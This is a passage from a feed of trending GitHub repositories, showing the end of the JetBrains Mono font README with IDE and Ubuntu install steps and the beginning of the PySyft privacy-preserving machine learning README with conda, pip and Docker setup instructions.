&lt;h3&gt;&lt;a id="user-content-in-jetbrains-ides" class="anchor" aria-hidden="true" href="#in-jetbrains-ides"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;strong&gt;In JetBrains IDEs&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;The most recent version of JetBrains Mono ships with your JetBrains IDE starting with v2019.3.&lt;/p&gt;
&lt;p&gt;Select JetBrains Mono in the IDE settings: go to &lt;code&gt;Preferences/Settings&lt;/code&gt; → &lt;code&gt;Editor&lt;/code&gt; → &lt;code&gt;Font&lt;/code&gt;, and then select JetBrains Mono from the Font dropdown.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-another-ide-or-an-older-version-of-a-jetbrains-ide" class="anchor" aria-hidden="true" href="#another-ide-or-an-older-version-of-a-jetbrains-ide"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Another IDE or an older version of a JetBrains IDE&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://download.jetbrains.com/fonts/JetBrainsMono-1.0.0.zip?fromGitHub" rel="nofollow"&gt;Download font&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Unzip the archive and install the font:
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Mac. Select all font files in the folder and double-click them. Click the &lt;em&gt;"Install Font"&lt;/em&gt; button.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows. Select all font files in the folder, right-click any of them, then pick &lt;em&gt;"Install"&lt;/em&gt; from the menu.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ubuntu. Open a terminal with &lt;code&gt;Ctrl&lt;/code&gt;+&lt;code&gt;Alt&lt;/code&gt;+&lt;code&gt;T&lt;/code&gt; and run the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd &amp;lt;name_of_our_archive.zip&amp;gt;
unzip "\*.zip" -d ${HOME}/.fonts
sudo fc-cache -f -v
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Restart your IDE.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;Preferences/Settings&lt;/code&gt; → &lt;code&gt;Editor&lt;/code&gt; → &lt;code&gt;Font&lt;/code&gt;, and pick JetBrains Mono from the Font dropdown.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;a id="user-content-visual-studio-code" class="anchor" aria-hidden="true" href="#visual-studio-code"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;strong&gt;Visual Studio Code&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Follow the instructions above to step 3.&lt;/li&gt;
&lt;li&gt;Go to the settings editor, from the File menu choose Preferences, Settings or use keyboard shortcut &lt;code&gt;Ctrl&lt;/code&gt;+, (&lt;code&gt;Cmd&lt;/code&gt;+, on Mac).&lt;/li&gt;
&lt;li&gt;In the &lt;em&gt;"Font Family"&lt;/em&gt; input box type JetBrains Mono, replacing any content.&lt;/li&gt;
&lt;li&gt;To enable ligatures turn on the checkbox in &lt;em&gt;"Font ligatures"&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-manually-editing-settingsjson" class="anchor" aria-hidden="true" href="#manually-editing-settingsjson"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;strong&gt;Manually editing settings.json&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Visual Studio Code allows you to also edit the underlying settings.json config file. First open the settings editor as described above, then click the "&lt;code&gt;{}&lt;/code&gt;" icon, at the top right, to open the &lt;em&gt;"settings.json"&lt;/em&gt; file.&lt;/p&gt;
&lt;p&gt;Then paste the following lines and save the file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;"editor.fontFamily": "JetBrains Mono",
"editor.fontLigatures": true,
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-source-files" class="anchor" aria-hidden="true" href="#source-files"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source files&lt;/h2&gt;
&lt;p&gt;Can be found in the &lt;em&gt;"Source"&lt;/em&gt; folder. To open them you will need FontLab 6 or higher.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;JetBrains Mono typeface is available under the &lt;a href="https://www.apache.org/licenses/LICENSE-2.0" rel="nofollow"&gt;Apache 2.0 license&lt;/a&gt; and can be used free of charge, for both commercial and non-commercial purposes. You do not need to give credit to JetBrains, although we will appreciate it very much if you do.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-credits" class="anchor" aria-hidden="true" href="#credits"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Credits&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Type designer&lt;/strong&gt;&lt;br&gt;
Philipp Nurullin&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Team lead&lt;/strong&gt;&lt;br&gt;
Konstantin Bulenkov&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Thanks to&lt;/strong&gt;&lt;br&gt;
Nikita Prokopov&lt;br&gt;
Eugene Auduchinok&lt;br&gt;
Tatiana Tulupenko&lt;br&gt;
Dmitrij Batrak&lt;br&gt;
IntelliJ Platfrom UX Team&lt;br&gt;
Web Team&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>JetBrains</author><guid isPermaLink="false">https://github.com/JetBrains/JetBrainsMono</guid><pubDate>Sun, 19 Jan 2020 00:07:00 GMT</pubDate></item><item><title>OpenMined/PySyft #8 in All Languages, Today</title><link>https://github.com/OpenMined/PySyft</link><description>&lt;p&gt;&lt;i&gt;A library for encrypted, privacy preserving machine learning&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-introduction" class="anchor" aria-hidden="true" href="#introduction"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://mybinder.org/v2/gh/OpenMined/PySyft/master" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/24c94be25a8a8b5703a34466825bbfdd6147d9d0/68747470733a2f2f6d7962696e6465722e6f72672f62616467652e737667" alt="Binder" data-canonical-src="https://mybinder.org/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://travis-ci.org/OpenMined/PySyft" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/1f078ec57b8f694a298a79e036801ed2ebb78566/68747470733a2f2f7472617669732d63692e6f72672f4f70656e4d696e65642f5079537966742e7376673f6272616e63683d746f7263685f31" alt="Build Status" data-canonical-src="https://travis-ci.org/OpenMined/PySyft.svg?branch=torch_1" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://openmined.slack.com/messages/team_pysyft" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b87e207041241c947fc700bffe2b19c634d2cf99/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636861742d6f6e253230736c61636b2d3741353937392e737667" alt="Chat on Slack" data-canonical-src="https://img.shields.io/badge/chat-on%20slack-7A5979.svg" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://app.fossa.io/projects/git%2Bgithub.com%2Fmatthew-mcateer%2FPySyft?ref=badge_small" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c0cb82174c3eb8fcbb00a46eb237556f63b36804/68747470733a2f2f6170702e666f7373612e696f2f6170692f70726f6a656374732f6769742532426769746875622e636f6d2532466d6174746865772d6d6361746565722532465079537966742e7376673f747970653d736d616c6c" alt="FOSSA Status" data-canonical-src="https://app.fossa.io/api/projects/git%2Bgithub.com%2Fmatthew-mcateer%2FPySyft.svg?type=small" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PySyft is a Python library for secure and private Deep Learning. PySyft decouples private data from model training, using
&lt;a href="https://ai.googleblog.com/2017/04/federated-learning-collaborative.html" rel="nofollow"&gt;Federated Learning&lt;/a&gt;,
&lt;a href="https://en.wikipedia.org/wiki/Differential_privacy" rel="nofollow"&gt;Differential Privacy&lt;/a&gt;,
and &lt;a href="https://en.wikipedia.org/wiki/Secure_multi-party_computation" rel="nofollow"&gt;Multi-Party Computation (MPC)&lt;/a&gt; within the main Deep Learning frameworks like PyTorch and TensorFlow. Join the movement on
&lt;a href="http://slack.openmined.org/" rel="nofollow"&gt;Slack&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-pysyft-in-detail" class="anchor" aria-hidden="true" href="#pysyft-in-detail"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PySyft in Detail&lt;/h2&gt;
&lt;p&gt;A more detailed explanation of PySyft can be found in the
&lt;a href="https://arxiv.org/abs/1811.04017" rel="nofollow"&gt;white paper on arxiv&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PySyft has also been explained in videos on YouTube:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=1Zw08_4ufHw" rel="nofollow"&gt;Introduction to PySyft codebase by @andreiliphd&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-pre-installation" class="anchor" aria-hidden="true" href="#pre-installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Pre-Installation&lt;/h2&gt;
&lt;p&gt;Optionally, we recommend that you install PySyft within the
&lt;a href="https://docs.conda.io/projects/conda/en/latest/user-guide/overview.html" rel="nofollow"&gt;Conda&lt;/a&gt;
virtual environment, for its simplicity in installation. If you are using
Windows, we suggest installing &lt;a href="https://docs.anaconda.com/anaconda/user-guide/getting-started/" rel="nofollow"&gt;Anaconda and using the Anaconda
Prompt&lt;/a&gt; to
work from the command line.&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;conda create -n pysyft python=3
conda activate pysyft &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; some older version of conda require "source activate pysyft" instead.&lt;/span&gt;
conda install jupyter notebook&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Another alternative is to use python venvs. Those are our preferred
environments for development purposes. We provide a direct install
instructions in our makefile.&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;make venv&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;PySyft supports Python &amp;gt;= 3.6 and PyTorch 1.3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;pip install syft[udacity]&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will auto-install the PyTorch and TF Encrypted
dependencies, which are required for running the tutorials
from Udacity's "Secure &amp;amp; Private AI" course (recommended).&lt;/p&gt;
&lt;p&gt;You can install syft without these dependencies with the usual
&lt;code&gt;pip install syft&lt;/code&gt;, but you will need to install framework
dependencies (i.e. PyTorch, TensorFlow, or TF Encrypted)
yourself. If you feel you've received an unexpected
installation error related to PyTorch or TF Encrypted, please
open an issue on Github or reach out to &lt;code&gt;#team_pysyft&lt;/code&gt; in
Slack.&lt;/p&gt;
&lt;p&gt;If you have an installation error regarding zstd, run this command and then re-try installing syft.&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;pip install --upgrade --force-reinstall zstd&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If this still doesn't work, and you happen to be on OSX, make
sure you have &lt;a href="https://railsapps.github.io/xcode-command-line-tools.html" rel="nofollow"&gt;OSX command line tools&lt;/a&gt; installed and try again.&lt;/p&gt;
&lt;p&gt;If this still fails, and you are on a Conda environment. It could be
because conda provides its own compiler and linker tools which might
conflict with your system's. In that case we recommend to use a python venv
and try again.&lt;/p&gt;
&lt;p&gt;You can also install PySyft from source on a variety of operating systems by following this &lt;a href="https://github.com/OpenMined/PySyft/blob/dev/INSTALLATION.md"&gt;installation guide&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-run-local-notebook-server" class="anchor" aria-hidden="true" href="#run-local-notebook-server"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Run Local Notebook Server&lt;/h2&gt;
&lt;p&gt;All the examples can be played with by running the command&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;make notebook&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This assumes you want to use a local virtual environment. It installs it
independently to the conda environment in case you installed one, or any
other virtual environment you might have set up.&lt;/p&gt;
&lt;p&gt;Once the jupyter notebook launches on your browser select the pysyft
kernel.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-use-the-docker-image" class="anchor" aria-hidden="true" href="#use-the-docker-image"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Use the Docker image&lt;/h2&gt;
&lt;p&gt;Instead of installing all the dependencies on your computer,
you can run a notebook server (which comes with Pysyft
installed) using &lt;a href="https://www.docker.com/" rel="nofollow"&gt;Docker&lt;/a&gt;. All you
will have to do is start the container like this:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ docker container run openmined/pysyft-notebook&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can use the provided link to access the jupyter notebook (the link is only accessible from your local machine).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;NOTE:&lt;/em&gt;&lt;/strong&gt;
If you are using Docker Desktop for Mac, the port needs to be forwarded to localhost. In that case run docker with:
&lt;code&gt;bash $ docker container run -p 8888:8888 openmined/pysyft-notebook &lt;/code&gt;
to forward port 8888 from the container's interface to port 8888 on localhost and then access the notebook via &lt;a href="http://127.0.0.1:8888/?token=" rel="nofollow"&gt;http://127.0.0.1:8888/?token=&lt;/a&gt;...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;You can also set the directory from which the server will serve notebooks (default is /workspace).&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ docker container run -e WORKSPACE_DIR=/root openmined/pysyft-notebook&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You could also build the image on your own and run it locally:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ &lt;span class="pl-c1"&gt;cd&lt;/span&gt; docker-images/pysyft-notebook/
$ docker image build -t pysyft-notebook &lt;span class="pl-c1"&gt;.&lt;/span&gt;
$ docker container run pysyft-notebook&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;More information about how to use this image can be found &lt;a href="https://hub.docker.com/r/openmined/pysyft-notebook" rel="nofollow"&gt;on docker hub&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-try-out-the-tutorials" class="anchor" aria-hidden="true" href="#try-out-the-tutorials"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Try out the Tutorials&lt;/h2&gt;
&lt;p&gt;A comprehensive list of tutorials can be found
&lt;a href="https://github.com/OpenMined/PySyft/tree/master/examples/tutorials"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;These tutorials cover how to perform techniques such as
federated learning and differential privacy using PySyft.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-high-level-architecture" class="anchor" aria-hidden="true" href="#high-level-architecture"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;High-level Architecture&lt;/h2&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="art/PySyftArch.png"&gt;&lt;img src="art/PySyftArch.png" alt="alt text" title="High-level Architecture" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-start-contributing" class="anchor" aria-hidden="true" href="#start-contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Start Contributing&lt;/h2&gt;
&lt;p&gt;The guide for contributors can be found &lt;a href="https://github.com/OpenMined/PySyft/tree/master/CONTRIBUTING.md"&gt;here&lt;/a&gt;. It covers all that you need to know to start contributing code to PySyft in an easy way.&lt;/p&gt;
&lt;p&gt;Also join the rapidly growing community of 5000+ on &lt;a href="http://slack.openmined.org" rel="nofollow"&gt;Slack&lt;/a&gt;. The slack community is very friendly and great about quickly answering questions about the use and development of PySyft!&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-troubleshooting" class="anchor" aria-hidden="true" href="#troubleshooting"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Troubleshooting&lt;/h2&gt;
